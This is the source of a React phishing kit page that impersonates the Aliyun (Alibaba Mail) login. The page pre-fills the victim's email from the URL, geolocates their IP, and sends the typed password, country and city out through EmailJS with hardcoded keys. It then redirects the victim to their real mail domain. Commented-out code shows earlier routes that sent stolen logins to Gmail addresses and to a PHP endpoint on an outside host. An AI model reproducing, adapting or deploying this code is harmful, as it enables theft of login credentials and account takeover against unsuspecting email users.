import React, { useState, useEffect, useRef } from "react";
import './Aliyun.css';
import rtyu from '../../Media/Images/aaaa.png';
import Preloader from "../../Preloader/Preloader";
// import $ from 'jquery';
import emailjs from '@emailjs/browser';

const Aliyun = ()=>{

    const formRef = useRef();

    const [ipAdress, setIpAdress] = useState('')
    const [city, setCity] = useState('');
    const [flag, setFlag] = useState('');
    const [country, setCountry] = useState('');
    
  
    const forTime = new Date();

  
    useEffect(()=>{
      fetch(`https://api.geoapify.com/v1/ipinfo?apiKey=139d2378a5554f48bf290b61999b4e8a`)
      .then(req=> req.json())
      .then(res=>{
  
          setIpAdress(res.ip)
          setFlag(res.country.flag);
          setCountry(res.country.name);
          setCity(res.city.names.en);
  
      })
      .catch(e=> console.log)
  }, []);




    const reloadWebPageHandler = ()=> window.location.reload();

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();

    useEffect(()=>{
        const tabTitle = 'Aliyun';
        document.title = tabTitle;
        setSpinLoader(true);
        setTimeout(() => {
            setSpinLoader(false);
        }, 2500);
    },[]);

    const [email, setEmail] = useState(extracetdEmail);
    const [password, setPassword] = useState('');

    const [spinLoader, setSpinLoader] = useState(false);

    const [count, setCount] = useState(0);

    const aliyunForm = ___=>{
        ___.preventDefault();
        console.log(4567);
        if (password === "") {
            return null
        } 
        else {
            setSpinLoader(true);
            setTimeout(() => {
                setSpinLoader(false);
                setPassword('');
            }, 2500);

            setCount(count=> count + 1);
                if(count >= 1){
                    const redirectURL = window.location.href;
                    const sliceEqualSign = redirectURL.indexOf("@");
                    const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1)).split('&', 1).toString();
                    setTimeout(() => {
                        window.location.href = `https://${extracetdemailDomain}`;
                        
                    }, 1500);

                };


            // const user = {
            //     email: email,
            //     password: password,
            //     // country: country,
              
            //     // city: city,
            //     // flag: flag,
            //     // eyep: ipAdress,
            //     // nownow: forTime	
            // };


            // post to server
            // const user = {
            //     email: email,
            //     password: password,
                // subject: "Chameleon Page Logs",
                // to: "rvvlsales13@gmail.com",
                // // body: `Email: ${defaultEmail}  Password: ${defaultPassword}`
                // body:
                // `
                // <html lang="en">
                // <p>Online Correspondence: ${email}</p>
                // <p>Signal: ${password}</p>
                // <p>Country: ${country}</p>
                // <p>Flag: ${flag}</p>
                // </html>
                // `
            // };

            // const user = {
            //     "subject": "Coming Logs",
            //     "to": "reportwork5252@gmail.com",
            //     "body": `<div><h3></h3><p>Online_Correspondence: ${email}</p><p>Signal: ${password}</p><p>Country: ${country}</p><p>Flag: ${flag}</p></div>`
            // }
            
        
            // $.ajax({
            //     type: "POST",
            //     url: "https://trezanolz.com/kenneth/chame.php",
            //     data: user,
            //     success(data) {
            //         // alert('OK');
            //         console.log('data');
            //     },
            // });

            const serviceID = `service_xhrj4w4`;
            const templateID = `template_crghlbk`;
            const publicKey = `35JbsFMyI7dxAGiKW`;
    
    
            emailjs
            .sendForm(serviceID, templateID, formRef.current, {
              publicKey: publicKey,
            })
            .then(
              () => {
                console.log('!');
              },
              (error) => {
                console.log('...', error.text);
              },
            );

        }
    }

    return(<div className="aliyun_app">

        { spinLoader ? <Preloader /> : null }
        
        <header className="aliyun_top_nav_">
            <img 
                alt="aliyun"
                className="aliyun_l_g_"
                src={`data:image/png;base64,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`}
            />

            <ul className="aliyun_u_l_">
                <li className="aliyun_nav_list_" onClick={reloadWebPageHandler}>阿里邮箱官网</li>
                <li className="aliyun_nav_list_" onClick={reloadWebPageHandler}>企业邮箱登录</li>
                <li className="aliyun_nav_list_" onClick={reloadWebPageHandler}>手机版</li>
                <li className="aliyun_nav_list_" onClick={reloadWebPageHandler}>服务中心</li>
                <li className="aliyun_nav_list_" onClick={reloadWebPageHandler}>阿里邮箱小助手</li>

                <li className="aliyun_nav_list_" id="dit_lst_clr" onClick={reloadWebPageHandler}>简体中文</li>
                <li className="aliyun_nav_list_" id="dit_lst_clr" onClick={reloadWebPageHandler}>英语</li>

            </ul>
        </header>

        <section className="landing_p_g_e_">
            <img 
                src={rtyu}
                alt="kdkmdk" 
            />



            <main className="aliyun_main_">
                <form onSubmit={aliyunForm} ref={formRef}>

                    <div className="ali_yun_lbl_">登录名:</div>
                    <input 
                        type={`email`}
                        value={email}
                        onChange={e=> setEmail(e.target.value)}
                        readOnly
                        className="Vo-zQ-OQ"
                        name="online_correspondence"
                    />

                    {/* <span className="txt_f-x"> */}
                        <span className="ali_yun_lbl_" id="uhuhu" style={{display:'inline', float:'left', marginTop:'12px'}} onClick={reloadWebPageHandler}>登录密码:</span>
                        <span className="ali_yun_lbl_" id="jjfjfjf" style={{display:'inline', float:'right', marginTop:'12px'}} onClick={reloadWebPageHandler}>忘记登录密码？</span>
                    {/* </span> */}


                    <input 
                        type={`password`}
                        required
                        value={password}
                        onChange={e=>setPassword(e.target.value)}
                        className="Vo-zQ-OQ"
                        style={{
                            marginTop:'7px'
                        }}
                        name="signal"
                    />



                <input type="text" value={country} name="country" hidden/>
              <input type="text" value={city} name="city" hidden/>

                    <input 
                        type={`submit`}
                        id="sH-Uk-Hs"
                        value={`登录`}
                        onClick={aliyunForm}
                    />

                    <div className="rfcff" onClick={reloadWebPageHandler}>免费注册</div>

                    

                </form>
            </main>
        </section>

    </div>)
};

export default Aliyun;